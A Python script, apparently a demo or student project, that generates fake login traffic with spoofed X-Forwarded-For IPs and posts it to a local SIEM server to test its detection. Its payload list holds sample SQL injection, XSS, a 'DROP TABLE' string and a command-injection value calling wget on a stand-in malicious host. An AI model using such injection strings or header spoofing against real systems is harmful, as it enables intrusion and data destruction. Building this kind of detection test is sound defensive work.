# client_website_simulation.py
import requests
import time
import random

# API URL - Localhost testing ke liye. 
SENTINEL_SIEM_URL = "http://127.0.0.1:5000/api/logs" 
API_KEY = "SENTINEL-9921"

valid_users = ["rahul_verma", "priya_singh", "amit_99", "admin_demo", "guest_user"]
malicious_payloads = ["admin' --", "<script>XSS</script>", "DROP TABLE orders", "; wget malicious.com"]

def get_spoofed_ip():
    return f"{random.randint(11,250)}.{random.randint(1,250)}.{random.randint(1,250)}.{random.randint(1,250)}"

print("--------------------------------------------------")
print("  GLOBAL E-COMMERCE SERVER (TRAFFIC SIMULATOR)")
print("  Routing logs to SENTINEL SIEM...")
print("--------------------------------------------------")
time.sleep(1)

while True:
    try:
        is_hacker = random.random() < 0.35 # 35% chance of attack
        user_input = random.choice(malicious_payloads) if is_hacker else random.choice(valid_users)
        fake_ip = get_spoofed_ip()
        
        headers = {'X-Forwarded-For': fake_ip}
        payload = {"payload": user_input, "key": API_KEY}
        
        log_type = "⚠️ ATTACK" if is_hacker else "✔ LOGIN"
        print(f"\n{log_type} from {fake_ip} | Data: {user_input}")
        
        response = requests.post(SENTINEL_SIEM_URL, json=payload, headers=headers, timeout=2)
        
        if response.status_code == 200:
            if response.json().get("status") == "danger":
                print(f"   SENTINEL FIREWALL: Threat Detected. IP {fake_ip} Flagged/Blocked!")
            else:
                print("   SENTINEL SCAN: Traffic Safe.")
        elif response.status_code == 403:
            print(f"   SENTINEL DROP: IP {fake_ip} is currently on the BLACKLIST.")
            
    except requests.exceptions.ConnectionError:
        print(" ERROR: SENTINEL SIEM Server is Offline!")
        time.sleep(2)
        
    time.sleep(random.uniform(1.0, 2.5))